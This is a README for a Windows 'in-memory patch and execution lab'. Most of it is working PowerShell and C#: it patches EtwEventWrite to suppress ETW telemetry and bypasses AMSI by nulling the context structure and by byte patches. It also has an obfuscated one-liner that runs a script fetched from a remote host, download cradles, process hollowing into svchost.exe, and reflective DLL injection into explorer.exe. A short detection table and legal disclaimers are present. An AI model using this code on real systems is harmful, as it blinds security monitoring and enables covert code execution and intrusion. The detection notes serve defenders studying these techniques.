# In‑Memory Patch & Execution Lab (PowerShell + C#)

> **Research & Education Use Only**
> All techniques shown here are for **defensive R\&D, red‑team simulation in legally authorized environments, and personal lab study**. Do **not** use against systems you do not own or have explicit written permission to test. Many organizations prohibit in‑memory patching, AMSI tampering, or unapproved code injection. You are solely responsible for complying with all laws, regulations, contracts, and policies.

---

## Table of Contents

* [Overview](#overview)
* [Legal / Ethical Notice](#legal--ethical-notice)
* [Key Capabilities](#key-capabilities)

  * [Inline Patch of ETW (`EtwEventWrite`) to Force Clean Return](#inline-patch-of-etwetweventwrite-to-force-clean-return)
  * [AMSI Bypass Variants](#amsi-bypass-variants)
  * [Executable‑to‑PowerShell Loader Pipeline](#executableto-powershell-loader-pipeline)
  * [Reflective PE Injection Helper](#reflective-pe-injection-helper)
* [Environment & Prereqs](#environment--prereqs)
* [Repo Layout (Suggested)](#repo-layout-suggested)
* [Core PowerShell Helpers](#core-powershell-helpers)

  * [`LookupFunc` – Resolve Export Address](#lookupfunc--resolve-export-address)
  * [`getDelegateType` – Dynamic Delegate Builder](#getdelegatetype--dynamic-delegate-builder)
* [ETW Patch Walkthrough](#etw-patch-walkthrough)
* [AMSI Bypass Techniques](#amsi-bypass-techniques)

  * [Method 1 – Null Out AMSI Context Structure](#method-1--null-out-amsi-context-structure)
  * [Method 2 – Patch `test rdx,rdx` → `xor rax,rax` Early Return](#method-2--patch-test-rdxrdx--xor-raxrax-early-return)
  * [Sub‑Method – Patch AMSI at Specific Offset (AmsiOpenSession / AmsiScanBuffer)](#submethod--patch-amsi-at-specific-offset-amsiopensession--amsiscanbuffer)
  * [Trivial Single‑Line AMSI Memory Patch](#trivial-singleline-amsi-memory-patch)
  * [Methods Observed Not to Work Reliably](#methods-observed-not-to-work-reliably)
* [Executable‑to‑PowerShell Loader Flow](#executabletopowershell-loader-flow)

  * [Step 1 – Compile Process Hollowing Binary (C# Example)](#step-1--compile-process-hollowing-binary-c-example)
  * [Step 2 – GZip + Base64 Encode Artifact](#step-2--gzip--base64-encode-artifact)
  * [Step 3 – In‑Memory Load & Invoke Entry Point](#step-3--inmemory-load--invoke-entry-point)
  * [Step 4 – Remote Load via Download Cradle](#step-4--remote-load-via-download-cradle)
* [Reflective PE Injection Example](#reflective-pe-injection-example)
* [Detection & Hardening Notes](#detection--hardening-notes)
* [Appendix A – PushAD / PushFD Refresher (x86)](#appendix-a--pushad--pushfd-refresher-x86)
* [Credits & References](#credits--references)

---

## Overview

This lab shows **how to patch security‑relevant Windows APIs in memory from PowerShell**, then chain that with **assembly‑loading, process hollowing, and reflective PE injection** workflows common in adversary simulations. The material is oriented toward:

* Red team operators validating control coverage.
* Blue teams building detection for memory tampering (ETW, AMSI, etc.).
* Malware development students studying API patching, PE parsing, and in‑memory execution pipelines.

Where possible, commentary explains *what* is changed, *why* it’s effective, and *what defenders can instrument to catch it*.

---

## Legal / Ethical Notice

You **must** have prior, written authorization before running any payload, patch, or injection against production systems. Many of the snippets here disable or degrade host defensive telemetry (ETW, AMSI) and could violate policy, compliance regimes, or law if misused. Use only in isolated lab ranges or during sanctioned red‑team / purple‑team engagements.

---

## Key Capabilities

### Inline Patch of ETW(`EtwEventWrite`) to Force Clean Return

A short x64 byte sequence (`xor rax,rax; ret`) is written over the start of `EtwEventWrite` in *ntdll.dll*. Returning zero suppresses event emission paths that depend on that API.

### AMSI Bypass Variants

Multiple techniques to short‑circuit AMSI scanning at different layers:

* Zero the AMSI context struct.
* Patch code path that checks pointer validity (`test rdx, rdx`) to always succeed.
* Patch selected offsets in `AmsiOpenSession` or `AmsiScanBuffer`.
* Quick one‑liner field tamper in `System.Management.Automation.AmsiUtils`.

### Executable‑to‑PowerShell Loader Pipeline

Workflow to take a compiled .NET binary (e.g., Process Hollowing PoC), compress + base64 it, embed in a PowerShell function, decompress & load into memory, and invoke `Main()` without touching disk.

### Reflective PE Injection Helper

Demonstrates using **Invoke-ReflectivePEInjection** to inject a downloaded DLL into a remote process (e.g., `explorer.exe`).

---

## Environment & Prereqs

| Requirement            | Notes                                                                                                                         |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Windows (x64)          | Tested against modern Windows 10/11; adjust for server builds.                                                                |
| PowerShell             | Works in **Windows PowerShell 5.x**; some techniques may require Full CLR loading not available in Constrained Language Mode. |
| .NET CLR access        | Uses reflection to reach `Microsoft.Win32.UnsafeNativeMethods`.                                                               |
| Execution Policy       | Bypass or Unrestricted recommended in lab.                                                                                    |
| Admin / High Integrity | Memory protection changes may require elevated permissions depending on target module & process.                              |

---

## Repo Layout (Suggested)

You can structure the GitHub repo like this:

```
.
├── README.md                     # This file
├── scripts/
│   ├── Patch-EtwEventWrite.ps1   # ETW patch PoC
│   ├── Patch-AmsiOpenSession.ps1 # AMSI patch (base)
│   ├── Patch-AmsiScanBuffer.ps1  # AMSI offset patch PoC
│   ├── Amsi-NullContext.ps1      # Context struct nulling
│   ├── Invoke-CSharpMain.ps1     # Base64 -> GZip -> Assembly load
│   └── ReflectivePE-Load.ps1     # Download & inject DLL into remote process
├── src/
│   └── ProcessHollowing/
│       ├── Program.cs            # C# hollowing example from docs below
│       └── ProcessHollowing.csproj
└── artifacts/
    ├── ConsoleApp1.exe           # Compiled payload (lab)
    ├── ConsoleApp1_Gzip_Base64.txt
    └── ConsoleApp1.dll           # DLL form for reflective injection
```

---

## Core PowerShell Helpers

Most scripts share two helper functions: `LookupFunc` to resolve an exported symbol from a loaded module using reflection into `System.dll`, and `getDelegateType` to build a dynamic delegate you can pass to `Marshal.GetDelegateForFunctionPointer()`.

### `LookupFunc` – Resolve Export Address

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
        $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll'
    }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $getModHandle = $assem.GetMethod('GetModuleHandle',
        [System.Reflection.BindingFlags] 'Public, Static, NonPublic',
        $null, [System.Type[]] @([String]), $null)
    $hModule = $getModHandle.Invoke($null, @($moduleName))

    $getProcAddr = $assem.GetMethod('GetProcAddress',
        [System.Reflection.BindingFlags] 'Public, Static, NonPublic',
        $null, [System.Type[]] @([IntPtr],[String]), $null)

    return $getProcAddr.Invoke($null, @($hModule, $functionName))
}
```

### `getDelegateType` – Dynamic Delegate Builder

Creates a runtime delegate matching an unmanaged function prototype signature so we can call exports like `VirtualProtect` directly.

```powershell
function getDelegateType {
    Param (
        [Parameter(Mandatory = $True, Position = 0)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain
        .DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        .DefineDynamicModule('InMemoryModule', $false)
        .DefineType('MyDelegateType','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName,HideBySig,Public',
        [System.Reflection.CallingConventions]::Standard,$func) | Out-Null
    $type.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$delType,$func) | Out-Null

    return $type.CreateType()
}
```

---

## ETW Patch Walkthrough

**Goal:** Overwrite `EtwEventWrite` in `ntdll.dll` with a tiny stub that clears `RAX` (return 0 / success code) and returns immediately, effectively short‑circuiting many ETW event writes triggered through user‑mode.

**Patch Bytes:**

```
0x48, 0x33, 0xC0, 0xC3   ; xor rax, rax ; ret
```

**Script Skeleton:**

```powershell
[IntPtr]$funcAddr = LookupFunc ntdll.dll EtwEventWrite
$oldProtectionBuffer = 0

$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualProtect),
    (getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType()) ([Bool])) )

# Make memory RWX, write patch, restore RX
$vp.Invoke($funcAddr, 4, 0x40, [ref]$oldProtectionBuffer)   # PAGE_EXECUTE_READWRITE
$buf = [Byte[]](0x48,0x33,0xC0,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 4)
$vp.Invoke($funcAddr, 4, 0x20, [ref]$oldProtectionBuffer)   # PAGE_EXECUTE_READ
```

**What Happens:** Calls to `EtwEventWrite` from that process now immediately return `STATUS_SUCCESS` (0) without forwarding event data to ETW consumers, degrading telemetry.

**Defender Ideas:** Monitor memory protection changes on loaded modules; hash/measure known API prologues; capture user‑mode ETW provider drops; alert on suspicious RWX toggles in signed DLL regions.

---

## AMSI Bypass Techniques

AMSI (Antimalware Scan Interface) provides a hookable content‑scanning path for scripts. Short‑circuiting it is a well known red‑team move; defenders should detect and block these.

### Method 1 – Null Out AMSI Context Structure

Set the underlying AMSI context object to `0` so subsequent validation checks fail open.

```powershell
$a=[Ref].Assembly.GetTypes(); foreach($b in $a){ if($b.Name -like "*iUtils"){$c=$b}}
$d=$c.GetFields('NonPublic,Static'); foreach($e in $d){ if($e.Name -like "*Context"){$f=$e}}
$g=$f.GetValue($null); [IntPtr]$ptr=$g; [Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Method 2 – Patch `test rdx,rdx` → `xor rax,rax` Early Return

Overwrite instruction(s) in `AmsiOpenSession` to always succeed and return a clean HRESULT.

```powershell
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualProtect),
    (getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType()) ([Bool])))

$vp.Invoke($funcAddr,3,0x40,[ref]$oldProtectionBuffer)
$buf=[Byte[]](0x48,0x31,0xC0) # xor rax,rax (3 bytes)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$funcAddr,3)
$vp.Invoke($funcAddr,3,0x20,[ref]$oldProtectionBuffer)
```

> *Note:* If you overwrite only the first 3 bytes, ensure the original instruction boundary aligns—otherwise use full disassembly to avoid corrupting subsequent instructions. In many PoC demos a minimal patch still works because the function returns before faulting.

### Sub‑Method – Patch AMSI at Specific Offset (AmsiOpenSession / AmsiScanBuffer)

Sometimes the stability move is to patch the instruction that evaluates a register **after** prologue. Example below targets offset `0xEA` from the start of `AmsiOpenSession` (lab value—**recalc per build**):

```powershell
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$offset = 0xEA
$patchAddr = $funcAddr.ToInt64() + $offset
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualProtect),
    (getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType()) ([Bool])))

$vp.Invoke($patchAddr,3,0x40,[ref]$oldProtectionBuffer)
$buf=[Byte[]](0x48,0x31,0xC0) # xor rax,rax
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$patchAddr,3)
$vp.Invoke($patchAddr,3,0x20,[ref]$oldProtectionBuffer)
```

### Trivial Single‑Line AMSI Memory Patch

Quick inline invocation + AMSI tamper + remote script exec:

```powershell
powershell "$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344);IEX (new-object system.net.webclient).downloadstring('http://192.168.56.1:9000/sc.txt')"
```

> Writes `0x41424344` ("ABCD") over the context structure; depending on the check logic this breaks scanning and forces clean exec.

### Methods Observed Not to Work Reliably

Attempted to flip the `*Failed` field in `AmsiUtils`:

```powershell
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d){if($e.Name -like "*Failed"){$f=$e}};$f.SetValue($null,$true)
```

In practice, modern AMSI build paths may not honor that flag; runtime behavior varies.

---

## Executable‑to‑PowerShell Loader Flow

Convert any .NET console binary (here: a **Process Hollowing PoC**) into a compressed + base64 string that you can embed in a PowerShell script and run fully in memory.

### Step 1 – Compile Process Hollowing Binary (C# Example)

The full source you provided is long; the important learning points are:

* Create suspended process (e.g., `svchost.exe`) using `CreateProcess` with `CREATE_SUSPENDED` (0x4).
* Use `ZwQueryInformationProcess` to get PEB and image base.
* Parse PE header to compute entry point RVA.
* Write payload shellcode to remote entry point with `WriteProcessMemory`.
* `ResumeThread` to run payload.

**See:** [`src/ProcessHollowing/Program.cs`](src/ProcessHollowing/Program.cs) for the full listing (copied from the conversation source). *Excerpt:*

```csharp
bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
    IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
...
ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
...
WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
ResumeThread(pi.hThread);
```

### Step 2 – GZip + Base64 Encode Artifact

```powershell
$fileBytes = [System.IO.File]::ReadAllBytes("C:\\Path\\To\\ConsoleApp1.exe")
$memoryStream = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream($memoryStream,[IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($fileBytes,0,$fileBytes.Length); $gzipStream.Close()
$base64String = [Convert]::ToBase64String($memoryStream.ToArray())
$base64String | Out-File -FilePath "ConsoleApp1_Gzip_Base64.txt"
```

### Step 3 – In‑Memory Load & Invoke Entry Point

Embed the base64 blob and call `Main()`:

```powershell
function Invoke-CSharpMain {
    $a = New-Object IO.MemoryStream(,[Convert]::FromBase64String('<GZIP_BASE64_HERE>'))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CompressionMode]::Decompress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo($output)
    [byte[]]$byteOutArray = $output.ToArray()

    $asm = [System.Reflection.Assembly]::Load($byteOutArray)

    # Capture stdout
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [Program]::Main()  # assumes Program.Main() entry point and no namespace

    [Console]::SetOut($OldConsoleOut)
    $StringWriter.ToString()
}

Invoke-CSharpMain
```

> **Important:** The assembly must expose a global `Program` type in the default namespace or update the call accordingly.

### Step 4 – Remote Load via Download Cradle

Classic PowerShell cradle to pull remote tooling:

```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Spoolsample.ps1')
```

Replace with your own raw GitHub path (private red‑team staging recommended).

---

## Reflective PE Injection Example

Download a DLL and inject into a live process using **Invoke-ReflectivePEInjection**:

```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.177/ConsoleApp1.dll')
$procid = (Get-Process -Name explorer | Select-Object -First 1).Id

iex (New-Object Net.WebClient).DownloadString('http://192.168.45.177/Invoke-ReflectivePEInjection.ps1')
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

> Many EDR products watch for reflective injection patterns. Use isolated lab hosts.

---

## Detection & Hardening Notes

Below are starting points for blue teams who want to detect or prevent these techniques.

| Technique                         | Detection Ideas                                                                                                                                | Hardening / Prevention                                                                                                    |                                                                                                       |
| --------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| ETW patch (`EtwEventWrite`)       | Monitor `VirtualProtect` calls into loaded, signed modules; scan memory for modified first bytes of known exports; ETW self‑health counters.   | Protected process light (PPL) for security tooling; code integrity; blocking RWX transitions in signed DLL pages via EDR. |                                                                                                       |
| AMSI tamper (context null, patch) | AMSI provider health check; memory compare of `amsi.dll` code in process vs on‑disk; alert on reflective access to `AmsiUtils` private fields. | AMSI instrumentation with additional integrity guard; script block logging; Constrained Language Mode; WDAC / AppLocker.  |                                                                                                       |
| In‑memory assembly load           | PowerShell Script Block + Module logging; `.NET` ETW loader events; unusual GZip+Base64 decode patterns.                                       | Restrict PowerShell to CLM; require signed scripts; disable DownloadString via proxy egress controls.                     |                                                                                                       |
| Reflective PE injection           | API call chain: `OpenProcess`/`WriteProcessMemory`/`CreateRemoteThread`                                                                        | `QueueUserAPC`; memory region with executable + writable; unsigned image mapping.                                         | EDR memory protection; attack surface reduction rules; LSASS and high‑value proc handle restrictions. |

---

## Appendix A – PushAD / PushFD Refresher (x86)

While most of the above lab is x64‑oriented, here’s a quick refresher from our earlier discussion.

### `PUSHAD` (x86)

Pushes 8 general‑purpose registers in this order: `EAX, ECX, EDX, EBX, ESP(original), EBP, ESI, EDI`.

### `POPAD` (x86)

Restores in reverse order **except ESP is skipped**: pops into `EDI, ESI, EBP, (discard), EBX, EDX, ECX, EAX`.

### `PUSHFD` / `POPFD`

Save/restore full 32‑bit `EFLAGS` to/from the stack.

**Stack Illustration:** If ESP was `0x1000` before `PUSHAD`:

```
ESP-4  = EAX
ESP-8  = ECX
ESP-12 = EDX
ESP-16 = EBX
ESP-20 = original ESP
ESP-24 = EBP
ESP-28 = ESI
ESP-32 = EDI   <-- deepest pushed
```

`POPAD` unwinds that region.

> Not available in x64; push/pop required per register.

---

## Credits & References

* Original PowerShell and C# snippets: *Provided by @<your-handle>* (Logan Klein) in lab notes.
* [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) – Collection of popular offensive tooling ported to PowerShell.
* Reflective PE Injection concept originally by Stephen Fewer; numerous community ports (e.g., PowerSploit variants).

---

### Contributing

PRs that add **defensive detections**, **safe lab harnesses**, or **version‑aware patching (symbol lookup, pattern scan)** are welcome. Please do **not** submit production malware.

### License

Choose one appropriate for dual‑use research (e.g., MIT w/ Responsible Use Clause). Add here once decided.

---

**Stay safe, stay legal, and happy researching.**
